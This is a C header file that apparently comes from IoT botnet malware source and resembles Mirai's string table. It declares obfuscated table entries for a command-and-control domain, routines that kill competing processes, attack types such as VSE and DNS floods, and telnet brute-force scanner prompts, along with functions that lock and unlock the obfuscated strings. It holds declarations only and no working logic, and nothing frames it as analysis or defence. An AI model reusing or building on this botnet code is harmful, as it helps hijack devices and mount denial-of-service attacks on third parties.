#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_EXEC_SUCCESS          1

#define TABLE_CNC_DOMAIN            2

#define TABLE_WATCHDOG1             3
#define TABLE_WATCHDOG2             4
#define TABLE_WATCHDOG3             5

#define TABLE_KILLER_TCP            6
#define TABLE_KILLER_PROC           7
#define TABLE_KILLER_EXE            8
#define TABLE_KILLER_FD             9
#define TABLE_KILLER_CMDLINE        10

#define TABLE_ATK_VSE               11
#define TABLE_ATK_RESOLVER          12
#define TABLE_ATK_NSERV             13

#define TABLE_SCAN_OPEN_OK          14
#define TABLE_SCAN_VERIFY_OK        15
#define TABLE_SCAN_RAND_NUM         16
#define TABLE_SCAN_SEG_FAULT        17
#define TABLE_SCAN_ILLEGAL          18
#define TABLE_SCAN_DLR_OUTPUT       19
#define TABLE_SCAN_ECHO_RESP        20
#define TABLE_SCAN_ASSWORD          21
#define TABLE_SCAN_OGIN             22
#define TABLE_SCAN_ENTER            23
#define TABLE_SCAN_BUSYBOX_RESP     24
#define TABLE_SCAN_NCORRECT         25
#define TABLE_SCAN_TNET_OPEN_ONCE   26
#define TABLE_SCAN_REPORT            27
#define TABLE_KILLER_SOFIA           28
#define TABLE_MAX_KEYS              29

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
